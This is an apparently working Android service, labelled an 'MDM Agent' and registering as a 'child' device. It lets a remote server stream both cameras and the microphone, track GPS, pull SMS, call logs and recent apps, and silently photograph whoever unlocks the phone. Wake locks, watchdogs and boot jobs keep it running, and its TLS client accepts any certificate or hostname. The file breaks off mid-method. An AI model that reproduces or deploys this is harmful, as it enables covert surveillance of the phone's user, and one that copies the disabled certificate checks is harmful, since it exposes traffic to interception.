package com.mdmagent.app;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.Uri;
import android.provider.CallLog;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioAttributes;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class MdmForegroundService extends Service {

    static final String CHANNEL_ID   = "mdm_monitoring";
    static final int    NOTIFICATION_ID = 101;
    static final String PREFS_NAME    = "mdm_prefs";
    static final String PREF_URL      = "server_url";
    static final String PREF_DEVICE_ID = "device_id";

    public static MdmForegroundService instance = null;

    // ── WebSocket ─────────────────────────────────────────────────────
    private OkHttpClient httpClient;
    private volatile WebSocket ws;   // volatile: read by cameraHandler thread
    private String savedUrl;
    private String savedDeviceId;
    private boolean shouldReconnect = false;
    private volatile boolean isConnecting = false;
    private ConnectivityManager.NetworkCallback networkCallback;
    private PowerManager.WakeLock connectionWakeLock; // keeps CPU+network alive in Doze
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable watchdog = new Runnable() {
        @Override public void run() {
            if (shouldReconnect && ws == null && !isConnecting && savedUrl != null) {
                doConnect();
            }
            mainHandler.postDelayed(this, 15_000); // check every 15s for fast reconnect
        }
    };

    // ── Front camera ──────────────────────────────────────────────────
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private boolean cameraActive = false;
    private long lastFrameMs = 0;
    private boolean pendingScreenshot = false;
    private PowerManager.WakeLock cameraWakeLock;

    // ── Back camera ───────────────────────────────────────────────────
    private HandlerThread cameraThreadBack;
    private Handler cameraHandlerBack;
    private CameraDevice cameraDeviceBack;
    private CameraCaptureSession captureSessionBack;
    private ImageReader imageReaderBack;
    private boolean cameraActiveBack = false;
    private long lastFrameMsBack = 0;
    private PowerManager.WakeLock cameraWakeLockBack;

    // ── Mic ───────────────────────────────────────────────────────────
    private AudioRecord audioRecord;
    private volatile boolean micActive = false;
    private Thread micThread;

    // ── Live speaker ──────────────────────────────────────────────────
    private AudioTrack audioTrack;
    private volatile boolean liveSpeakActive = false;

    // ── One-shot speaker ──────────────────────────────────────────────
    private MediaPlayer mediaPlayer;

    // ── Location ──────────────────────────────────────────────────────
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean locationActive = false;

    // ── Battery polling ───────────────────────────────────────────────
    private boolean batteryPollingActive = false;
    private static final long BATTERY_INTERVAL_MS = 30_000;

    // ── Screen state ──────────────────────────────────────────────────
    private BroadcastReceiver screenReceiver;
    private long screenStateChangedAt = System.currentTimeMillis();
    private boolean isScreenOn = true;
    private boolean pendingUnlockPhoto = false;

    // ── Recent apps auto-poll ─────────────────────────────────────────
    private boolean recentAppsPollingActive = false;
    private String lastUsedAppPkg = null;

    // ─────────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        // PARTIAL_WAKE_LOCK: keeps CPU awake so network stays active even in Doze mode.
        // Without this, Android restricts network after ~10 min idle → WebSocket drops.
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        connectionWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MdmAgent:Network");
        connectionWakeLock.acquire();
        createNotificationChannel();
        applyForeground();
        registerScreenReceiver();
        startRecentAppsPolling();
        registerNetworkCallback();
        HeartbeatReceiver.schedule(this);
        BootJobService.ensureScheduled(this); // persistent JobScheduler fallback for OEM boot blocks
        mainHandler.postDelayed(watchdog, 30_000);
        // Auto-connect with stored credentials (handles boot/restart with no Activity)
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String url      = prefs.getString(PREF_URL, null);
        String deviceId = prefs.getString(PREF_DEVICE_ID, null);
        if (url != null && deviceId != null) {
            mainHandler.postDelayed(() -> connect(url, deviceId), 1000);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (screenReceiver != null) { try { unregisterReceiver(screenReceiver); } catch (Exception ignored) {} screenReceiver = null; }
        mainHandler.removeCallbacks(watchdog);
        stopRecentAppsPolling();
        unregisterNetworkCallback();
        if (connectionWakeLock != null && connectionWakeLock.isHeld()) {
            try { connectionWakeLock.release(); } catch (Exception ignored) {}
        }
        instance = null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        applyForeground();
        HeartbeatReceiver.schedule(this); // reschedule next heartbeat on every start
        // Reconnect if socket is down (covers OS restart, OEM kill, heartbeat wakeup)
        if (ws == null || !shouldReconnect) {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String url      = prefs.getString(PREF_URL, null);
            String deviceId = prefs.getString(PREF_DEVICE_ID, null);
            if (url != null && deviceId != null) {
                savedUrl = url; savedDeviceId = deviceId; shouldReconnect = true;
                if (httpClient == null) httpClient = buildClient();
                if (ws == null) mainHandler.postDelayed(() -> doConnect(), 500);
            }
        }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    // ── Public API (called by NativeSocketPlugin) ─────────────────────

    public void connect(String url, String deviceId) {
        if (url == null || deviceId == null) return;
        // Skip reconnect if already connected with same credentials — prevents double-connect
        // from NativeSocket.connect() (JS) racing with onCreate()'s auto-connect.
        if (url.equals(savedUrl) && deviceId.equals(savedDeviceId) && ws != null && !isConnecting) {
            shouldReconnect = true;
            return;
        }
        savedUrl        = url;
        savedDeviceId   = deviceId;
        shouldReconnect = true;
        isConnecting    = false;
        if (httpClient == null) httpClient = buildClient();
        doConnect();
    }

    /** Called when phone is shutting down — close WebSocket so server marks device offline instantly */
    public void notifyShutdown() {
        shouldReconnect = false;
        if (ws != null) { ws.close(1000, "shutdown"); ws = null; }
    }

    public void disconnect() {
        shouldReconnect = false;
        stopBatteryPolling();
        stopCameraFront(); stopCameraBack();
        stopMicNative(); stopLiveSpeakNative();
        stopLocationUpdates();
        if (ws != null) { ws.cancel(); ws = null; }
    }

    public void socketEmit(String event, JSONObject data) {
        sendEvent(event, data);
    }

    // Delegates to NativeSocketPlugin's JS bridge when WebView is alive
    void fireJs(String event, String jsonPayload) {
        NativeSocketPlugin p = NativeSocketPlugin.instance;
        if (p != null) p.fireJsPublic(event, jsonPayload);
    }

    // ── WebSocket ─────────────────────────────────────────────────────
    private OkHttpClient buildClient() {
        try {
            X509TrustManager trust = new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] c, String a) {}
                public void checkServerTrusted(X509Certificate[] c, String a) {}
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            };
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, new TrustManager[]{trust}, new java.security.SecureRandom());
            return new OkHttpClient.Builder()
                    .sslSocketFactory(sc.getSocketFactory(), trust)
                    .hostnameVerifier((h, s) -> true)
                    .pingInterval(20, TimeUnit.SECONDS)
                    .connectTimeout(15, TimeUnit.SECONDS)
                    .readTimeout(0, TimeUnit.SECONDS)
                    .build();
        } catch (Exception e) { return new OkHttpClient(); }
    }

    private void doConnect() {
        if (isConnecting) return; // prevent duplicate simultaneous attempts
        if (savedUrl == null || savedDeviceId == null) return;
        isConnecting = true;
        if (ws != null) { ws.cancel(); ws = null; }
        String wsUrl = savedUrl
                .replace("https://", "wss://").replace("http://", "ws://")
                + "/socket.io/?EIO=4&transport=websocket&role=child&deviceId=" + savedDeviceId;

        ws = httpClient.newWebSocket(new Request.Builder().url(wsUrl).build(), new WebSocketListener() {
            @Override public void onOpen(WebSocket s, Response r) {
                isConnecting = false;
                s.send("40");
                startBatteryPolling();
            }
            @Override public void onMessage(WebSocket s, String text) {
                if (text.startsWith("0")) {
                    sendBatteryUpdate();
                } else if (text.startsWith("40")) {
                    fireJs("connect", null);
                    sendBatteryUpdate();
                    sendScreenStatus(isScreenOn ? "on" : "off", 0);
                } else if (text.equals("2")) {
                    s.send("3");
                } else if (text.startsWith("42")) {
                    handleServerEvent(text.substring(2));
                }
            }
            @Override public void onFailure(WebSocket s, Throwable t, Response r) {
                isConnecting = false;
                ws = null;
                fireJs("connect_error", "\"" + (t != null ? t.getMessage() : "failed") + "\"");
                stopBatteryPolling();
                scheduleReconnect();
            }
            @Override public void onClosed(WebSocket s, int code, String reason) {
                isConnecting = false;
                ws = null;
                fireJs("disconnect", null);
                stopBatteryPolling();
                scheduleReconnect();
            }
        });
    }

    private void scheduleReconnect() {
        if (!shouldReconnect) return;
        mainHandler.postDelayed(() -> { if (shouldReconnect && ws == null && !isConnecting) doConnect(); }, 3000);
    }

    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;
            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override public void onAvailable(Network network) {
                    // Internet is up — reconnect immediately if we're supposed to be connected
                    mainHandler.postDelayed(() -> {
                        if (shouldReconnect && ws == null && !isConnecting && savedUrl != null) {
                            doConnect();
                        }
                    }, 1500); // small delay to let network fully stabilise
                }
            };
            NetworkRequest req = new NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .build();
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    private void unregisterNetworkCallback() {
        if (networkCallback == null) return;
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) cm.unregisterNetworkCallback(networkCallback);
        } catch (Exception ignored) {}
        networkCallback = null;
    }

    private void handleServerEvent(String payload) {
        try {
            JSONArray arr = new JSONArray(payload);
            String evt  = arr.getString(0);
            String data = arr.length() > 1 ? arr.get(1).toString() : "null";

            switch (evt) {
                case "cmd:camera:start":
                case "cmd:camera:start:front":
                    startCameraFront(); fireJs(evt, null); break;
                case "cmd:camera:stop":
                case "cmd:camera:stop:front":
                    stopCameraFront(); fireJs(evt, null); break;
                case "cmd:camera:start:back":
                    startCameraBack(); fireJs("cmd:camera:start:back", null); break;
                case "cmd:camera:stop:back":
                    stopCameraBack(); fireJs("cmd:camera:stop:back", null); break;

                case "cmd:mic:on":
                    startMicNative(); fireJs("cmd:mic:on", null); break;
                case "cmd:mic:off":
                    stopMicNative(); fireJs("cmd:mic:off", null); break;

                case "cmd:speak:live:start":
                    startLiveSpeakNative(); fireJs("cmd:speak:live:start", null); break;
                case "cmd:speak:live:stop":
                    stopLiveSpeakNative(); fireJs("cmd:speak:live:stop", null); break;
                case "speak:live:chunk":
                    writeLiveAudioChunk(data); break;

                case "cmd:speak":
                    try {
                        String audioData = new JSONObject(data).getString("audioData");
                        playAudioNative(audioData);
                    } catch (Exception ignored) {}
                    fireJs("cmd:speak", null); break;

                case "cmd:screenshot":
                    if (cameraActive) pendingScreenshot = true;
                    else takeScreenshotNative();
                    break;

                case "cmd:location:start":
                    startLocationUpdates(); fireJs("cmd:location:start", null); break;
                case "cmd:location:stop":
                    stopLocationUpdates(); fireJs("cmd:location:stop", null); break;

                case "cmd:get:calllogs":   readCallLogs(); break;
                case "cmd:get:sms":        readSMS(); break;
                case "cmd:get:recent:apps": readRecentApps(); break;

                default:
                    fireJs(evt, data.equals("null") ? null : data); break;
            }
        } catch (Exception ignored) {}
    }

    private void sendEvent(String event, JSONObject data) {
        if (ws == null) return;
        try {
            JSONArray arr = new JSONArray();
            arr.put(event);
            if (data != null) arr.put(data);
            ws.send("42" + arr.toString());
        } catch (Exception ignored) {}
    }

    // ── Battery ───────────────────────────────────────────────────────
    private void startBatteryPolling() {
        if (batteryPollingActive) return;
        batteryPollingActive = true;
        scheduleBatteryPoll();
    }

    private void stopBatteryPolling() { batteryPollingActive = false; }

    private void scheduleBatteryPoll() {
        mainHandler.postDelayed(() -> {
            if (!batteryPollingActive) return;
            sendBatteryUpdate();
            scheduleBatteryPoll();
        }, BATTERY_INTERVAL_MS);
    }

    private void sendBatteryUpdate() {
        try {
            Intent intent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent == null) return;
            int level  = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale  = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            int pct    = (scale > 0) ? (int)(level * 100f / scale) : -1;
            boolean charging = (status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                             || status == android.os.BatteryManager.BATTERY_STATUS_FULL);
            JSONObject d = new JSONObject();
            d.put("level", pct); d.put("charging", charging);
            sendEvent("battery:update", d);
        } catch (Exception ignored) {}
    }

    // ── Location ──────────────────────────────────────────────────────
    private void startLocationUpdates() {
        if (locationActive) return;
        locationActive = true;
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override public void onLocationChanged(Location loc) {
                try {
                    JSONObject d = new JSONObject();
                    d.put("lat",       loc.getLatitude());
                    d.put("lng",       loc.getLongitude());
                    d.put("accuracy",  loc.getAccuracy());
                    d.put("altitude",  loc.getAltitude());
                    d.put("speed",     loc.getSpeed());
                    d.put("provider",  loc.getProvider());
                    d.put("timestamp", System.currentTimeMillis());
                    sendEvent("location:update", d);
                } catch (Exception ignored) {}
            }
            @Override public void onProviderEnabled(String p) {}
            @Override public void onProviderDisabled(String p) {}
        };
        try {
            boolean gpsOk = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean netOk = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
            if (gpsOk) locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 5000, 5, locationListener, Looper.getMainLooper());
            if (netOk) locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER, 5000, 5, locationListener, Looper.getMainLooper());
            Location last = gpsOk ? locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) : null;
            if (last == null && netOk) last = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (last != null) locationListener.onLocationChanged(last);
        } catch (SecurityException ignored) {}
    }

    private void stopLocationUpdates() {
        locationActive = false;
        if (locationManager != null && locationListener != null) {
            try { locationManager.removeUpdates(locationListener); } catch (Exception ignored) {}
        }
        locationListener = null;
    }

    // ── Front Camera2 ─────────────────────────────────────────────────
    private void startCameraFront() {
        if (cameraActive) return;
        cameraActive = true;
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        cameraWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MdmAgent:CameraFront");
        cameraWakeLock.acquire();
        cameraThread = new HandlerThread("MdmCamera");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        try {
            CameraManager mgr = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : mgr.getCameraIdList()) {
                CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) { camId = id; break; }
            }
            if (camId == null && mgr.getCameraIdList().length > 0) camId = mgr.getCameraIdList()[0];
            if (camId == null) { cameraActive = false; return; }

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                long now = System.currentTimeMillis();
                boolean isShot   = pendingScreenshot;
                boolean isUnlock = pendingUnlockPhoto;
                if (!isShot && !isUnlock && now - lastFrameMs < 250) { img.close(); return; }
                lastFrameMs = now;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject d = new JSONObject();
                    d.put("frame", b64); d.put("cameraType", "front");
                    sendEvent("camera:frame", d);
                    if (isShot)   { pendingScreenshot = false; sendEvent("screenshot:data", d); }
                    if (isUnlock) { pendingUnlockPhoto = false;
                        JSONObject ud = new JSONObject(); ud.put("frame", b64); ud.put("timestamp", now);
                        sendEvent("unlock:photo", ud); }
                } catch (Exception ignored) {
                } finally { img.close(); }
            }, cameraHandler);

            mgr.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        camera.createCaptureSession(Arrays.asList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                        req.addTarget(imageReader.getSurface());
                                        session.setRepeatingRequest(req.build(), null, cameraHandler);
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {
                                    cameraActive = false; sendCameraError("front", "config failed");
                                }
                            }, cameraHandler);
                    } catch (Exception ignored) {}
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActive = false; }
                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActive = false; sendCameraError("front", "hw error " + e); }
            }, cameraHandler);
        } catch (Exception e) { cameraActive = false; }
    }

    private void stopCameraFront() {
        cameraActive = false;
        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
        try { if (cameraDevice   != null) { cameraDevice.close();   cameraDevice   = null; } } catch (Exception ignored) {}
        try { if (imageReader    != null) { imageReader.close();     imageReader    = null; } } catch (Exception ignored) {}
        if (cameraThread != null) { cameraThread.quitSafely(); cameraThread = null; }
        if (cameraWakeLock != null && cameraWakeLock.isHeld()) { cameraWakeLock.release(); cameraWakeLock = null; }
    }

    // ── Back Camera2 ──────────────────────────────────────────────────
    private void startCameraBack() {
        if (cameraActiveBack) return;
        cameraActiveBack = true;
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        cameraWakeLockBack = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MdmAgent:CameraBack");
        cameraWakeLockBack.acquire();
        cameraThreadBack = new HandlerThread("MdmCameraBack");
        cameraThreadBack.start();
        cameraHandlerBack = new Handler(cameraThreadBack.getLooper());
        try {
            CameraManager mgr = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : mgr.getCameraIdList()) {
                CameraCharacteristics ch = mgr.getCameraCharacteristics(id);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) { camId = id; break; }
            }
            if (camId == null) { cameraActiveBack = false; return; }

            imageReaderBack = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReaderBack.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                long now = System.currentTimeMillis();
                if (now - lastFrameMsBack < 250) { img.close(); return; }
                lastFrameMsBack = now;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject d = new JSONObject();
                    d.put("frame", b64); d.put("cameraType", "back");
                    sendEvent("camera:frame", d);
                } catch (Exception ignored) {
                } finally { img.close(); }
            }, cameraHandlerBack);

            mgr.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDeviceBack = camera;
                    try {
                        camera.createCaptureSession(Arrays.asList(imageReaderBack.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    captureSessionBack = session;
                                    try {
                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                        req.addTarget(imageReaderBack.getSurface());
                                        session.setRepeatingRequest(req.build(), null, cameraHandlerBack);
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) {
                                    cameraActiveBack = false; sendCameraError("back", "config failed");
                                }
                            }, cameraHandlerBack);
                    } catch (Exception ignored) {}
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActiveBack = false; }
                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActiveBack = false; sendCameraError("back", "hw error " + e); }
            }, cameraHandlerBack);
        } catch (Exception e) { cameraActiveBack = false; }
    }

    private void stopCameraBack() {
        cameraActiveBack = false;
        try { if (captureSessionBack != null) { captureSessionBack.close(); captureSessionBack = null; } } catch (Exception ignored) {}
        try { if (cameraDeviceBack   != null) { cameraDeviceBack.close();   cameraDeviceBack   = null; } } catch (Exception ignored) {}
        try { if (imageReaderBack    != null) { imageReaderBack.close();     imageReaderBack    = null; } } catch (Exception ignored) {}
        if (cameraThreadBack != null) { cameraThreadBack.quitSafely(); cameraThreadBack = null; }
        if (cameraWakeLockBack != null && cameraWakeLockBack.isHeld()) { cameraWakeLockBack.release(); cameraWakeLockBack = null; }
    }

    private void sendCameraError(String cameraType, String reason) {
        try { JSONObject d = new JSONObject(); d.put("cameraType", cameraType); d.put("reason", reason); sendEvent("camera:error", d); } catch (Exception ignored) {}
    }

    // ── Screenshot ────────────────────────────────────────────────────
    private void takeScreenshotNative() {
        cameraActive = true; pendingScreenshot = true;
        cameraThread = new HandlerThread("MdmScreenshot"); cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        try {
            CameraManager mgr = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = mgr.getCameraIdList().length > 0 ? mgr.getCameraIdList()[0] : null;
            if (camId == null) { cameraActive = false; pendingScreenshot = false; return; }
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage(); if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()]; buf.get(bytes);
                    JSONObject d = new JSONObject(); d.put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP));
                    sendEvent("screenshot:data", d);
                } catch (Exception ignored) { } finally { img.close(); stopCameraFront(); }
            }, cameraHandler);
            mgr.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        camera.createCaptureSession(Arrays.asList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    try {
                                        CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        req.addTarget(imageReader.getSurface());
                                        session.capture(req.build(), null, cameraHandler);
                                    } catch (Exception ignored) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession s) { stopCameraFront(); }
                            }, cameraHandler);
                    } catch (Exception ignored) { stopCameraFront(); }
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); cameraActive = false; }
                @Override public void onError(CameraDevice c, int e) { c.close(); cameraActive = false; }
            }, cameraHandler);
        } catch (Exception e) { cameraActive = false; pendingScreenshot = false; }
    }

    // ── Mic ───────────────────────────────────────────────────────────
    private void startMicNative() {
        if (micActive) return;
        micActive = true;
        int sr = 16000;
        int bufSize = Math.max(AudioRecord.getMinBufferSize(sr, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT), 3200);
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, sr, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize * 4);
        audioRecord.startRecording();
        try { JSONObject s = new JSONObject(); s.put("active", true); sendEvent("mic:state", s); } catch (Exception ignored) {}
        micThread = new Thread(() -> {
            byte[] buf = new byte[bufSize];
            while (micActive) {
                int n = audioRecord.read(buf, 0, bufSize);
                if (n > 0 && ws != null) {
                    try {
                        JSONObject d = new JSONObject();
                        d.put("chunk", Base64.encodeToString(Arrays.copyOf(buf, n), Base64.NO_WRAP));
                        d.put("format", "pcm16"); d.put("sampleRate", sr);
                        sendEvent("mic:audio", d);
                    } catch (Exception ignored) {}
                }
            }
        });
        micThread.setDaemon(true); micThread.start();
    }

    private void stopMicNative() {
        micActive = false;
        if (audioRecord != null) { try { audioRecord.stop(); audioRecord.release(); } catch (Exception ignored) {} audioRecord = null; }
        try { JSONObject d = new JSONObject(); d.put("active", false); sendEvent("mic:state", d); } catch (Exception ignored) {}
    }

    // ── Live Speaker ──────────────────────────────────────────────────
    private void startLiveSpeakNative() {
        if (liveSpeakActive) return;
        liveSpeakActive = true;
        int sr = 16000;
        int minBuf = AudioTrack.getMinBufferSize(sr, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
        try {
            audioTrack = new AudioTrack.Builder()
                .setAudioAttributes(new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH).build())
                .setAudioFormat(new AudioFormat.Builder()
                    .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                    .setSampleRate(sr).setChannelMask(AudioFormat.CHANNEL_OUT_MONO).build())
                .setBufferSizeInBytes(minBuf * 4)
                .setTransferMode(AudioTrack.MODE_STREAM).build();
            audioTrack.play();
        } catch (Exception e) { liveSpeakActive = false; }
    }

    private void stopLiveSpeakNative() {
        liveSpeakActive = false;
        if (audioTrack != null) { try { audioTrack.stop(); audioTrack.release(); } catch (Exception ignored) {} audioTrack = null; }
    }

    private void writeLiveAudioChunk(String jsonData) {
        if (!liveSpeakActive || audioTrack == null) return;
        try {
            byte[] pcm = Base64.decode(new JSONObject(jsonData).getString("chunk"), Base64.DEFAULT);
            audioTrack.write(pcm, 0, pcm.length);
        } catch (Exception ignored) {}
    }

    // ── One-shot speaker ──────────────────────────────────────────────
    private void playAudioNative(String base64Data) {
        try {
            byte[] data = Base64.decode(base64Data, Base64.DEFAULT);
            File tmp = File.createTempFile("spk_", ".webm", getCacheDir());
            try (FileOutputStream fos = new FileOutputStream(tmp)) { fos.write(data); }
            mainHandler.post(() -> {
                try {
                    if (mediaPlayer != null) { mediaPlayer.release(); mediaPlayer = null; }
                    mediaPlayer = new MediaPlayer();
                    mediaPlayer.setDataSource(tmp.getAbsolutePath());
                    mediaPlayer.setOnCompletionListener(mp -> { mp.release(); mediaPlayer = null; tmp.delete(); fireJs("speak:done", null); });
                    mediaPlayer.setOnErrorListener((mp, w, e) -> { mp.release(); mediaPlayer = null; tmp.delete(); return true; });
                    mediaPlayer.prepare(); mediaPlayer.start();
                } catch (Exception e) { tmp.delete(); }
            });
        } catch (Exception ignored) {}
    }

    // ── Foreground notification ───────────────────────────────────────
    private void applyForeground() {
        Notification notif = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
            if (hasPermission(Manifest.permission.CAMERA))
                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && hasPermission(Manifest.permission.RECORD_AUDIO))
                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
            if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) || hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION))
                type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
            startForeground(NOTIFICATION_ID, notif, type);
        } else {
            startForeground(NOTIFICATION_ID, notif);
        }
    }

    private boolean hasPermission(String perm) {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED;
    }

    private void createNotificationChannel() {
        NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "MDM Agent", NotificationManager.IMPORTANCE_LOW);
        ch.setDescription("MDM Agent is running"); ch.setShowBadge(false);
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm != null) nm.createNotificationChannel(ch);
    }

    // ── Screen on/off/unlock receiver ─────────────────────────────────
    private void registerScreenReceiver() {
        screenReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context ctx, Intent intent) {
                String action = intent.getAction();
